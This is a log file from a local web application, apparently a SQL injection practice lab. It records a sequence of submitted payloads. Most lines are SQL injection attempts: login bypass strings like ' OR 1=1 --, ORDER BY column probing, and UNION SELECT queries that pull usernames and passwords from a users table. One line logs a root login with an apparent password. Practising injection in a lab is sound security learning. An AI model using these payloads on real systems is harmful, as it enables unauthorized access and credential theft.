[2025-07-30 18:08:13] [::1] [Classic Login] Payload: username=root&password=01067783188
[2025-07-30 18:09:58] [::1] [Classic Login] Payload: id=2
[2025-07-30 18:11:05] [::1] [Classic Login] Payload: id=2
[2025-07-30 18:11:10] [::1] [Classic Login] Payload: id=2
[2025-07-30 18:11:32] [::1] [union_sqli Login] Payload: id=2
[2025-07-30 18:11:46] [::1] [union_sqli Login] Payload: id=2
[2025-07-30 18:16:58] [::1] [dump_tables Login] Payload: table=users
[2025-07-30 19:38:13] [::1] [Classic Login] Payload: username=test&password=test
[2025-07-30 19:38:55] [::1] [Classic Login] Payload: username=OR+%271%27%3D%271%27--&password=test
[2025-07-30 19:39:04] [::1] [Classic Login] Payload: username=%27%20OR+%271%27%3D%271%27--&password=test
[2025-07-30 19:39:19] [::1] [Classic Login] Payload: username=%27+OR+1%3D1+--&password=test
[2025-07-30 19:39:49] [::1] [Classic Login] Payload: username=%27+OR+1%3D1+--&password=test
[2025-07-30 19:42:25] [::1] [Classic Login] Payload: username=admin&password=test
[2025-07-30 19:42:32] [::1] [Classic Login] Payload: username=admin&password=%27+OR+1%3D1+--
[2025-07-30 19:44:59] [::1] [union_sqli Login] Payload: id=ORDER+BY+1--
[2025-07-30 19:45:13] [::1] [union_sqli Login] Payload: id=%27+ORDER+BY+1--
[2025-07-30 19:46:11] [::1] [union_sqli Login] Payload: id=%27+ORDER+BY+2--
[2025-07-30 19:46:18] [::1] [union_sqli Login] Payload: id=%27+ORDER+BY+3--
[2025-07-30 19:47:11] [::1] [union_sqli Login] Payload: id=id=1%20ORDER%20BY%202--%20-
[2025-07-30 19:48:00] [::1] [union_sqli Login] Payload: id=%27+ORDER+BY+2+--
[2025-07-30 19:48:48] [::1] [union_sqli Login] Payload: id=%27+ORDER+BY+2+--+-
[2025-07-30 19:49:11] [::1] [union_sqli Login] Payload: id=1+%27+ORDER+BY+2+--+-
[2025-07-30 19:49:33] [::1] [union_sqli Login] Payload: id=1%27+ORDER+BY+2+--+-
[2025-07-30 19:49:45] [::1] [union_sqli Login] Payload: id=1%27+ORDER+BY+2+OR+1%3D1+--
[2025-07-30 19:50:02] [::1] [union_sqli Login] Payload: id=1
[2025-07-30 19:50:30] [::1] [union_sqli Login] Payload: id=ORDER+BY+2+--+-1%3D%3D1
[2025-07-30 19:50:36] [::1] [union_sqli Login] Payload: id=ORDER+BY+2+--+-
[2025-07-30 19:50:53] [::1] [union_sqli Login] Payload: id=1
[2025-07-30 19:51:27] [::1] [union_sqli Login] Payload: ?id=1%20ORDER%20BY%202--%20-
[2025-07-30 19:51:44] [::1] [union_sqli Login] Payload: ?id=?id=-1%20UNION%20SELECT%201,2--%20-
[2025-07-30 19:52:03] [::1] [union_sqli Login] Payload: id=-1%20UNION%20SELECT%201,2--%20-
[2025-07-30 19:53:01] [::1] [union_sqli Login] Payload: id=1%20UNION%20SELECT%201,2--
[2025-07-30 19:54:41] [::1] [union_sqli Login] Payload: id=
[2025-07-30 19:56:16] [::1] [union_sqli Login] Payload: id=?id=-1%20UNION%20SELECT%20username,%20password%20FROM%20users--%20-
[2025-07-30 19:56:23] [::1] [union_sqli Login] Payload: ?id=-1%20UNION%20SELECT%20username,%20password%20FROM%20users--%20-
[2025-07-30 19:56:25] [::1] [union_sqli Login] Payload: id=-1%20UNION%20SELECT%20username,%20password%20FROM%20users--%20-
[2025-07-30 19:58:10] [::1] [union_sqli Login] Payload: id=-1%20UNION%20SELECT%201,2--%20-UNION%20SELECT%20username,%20password%20FROM%20users--%20-
[2025-07-30 19:59:32] [::1] [union_sqli Login] Payload: id=-1%20UNION%20SELECT%20username,%20password%20FROM%20users--%20-
[2025-07-30 20:04:07] [::1] [Classic Login] Payload: username=admin&password=test
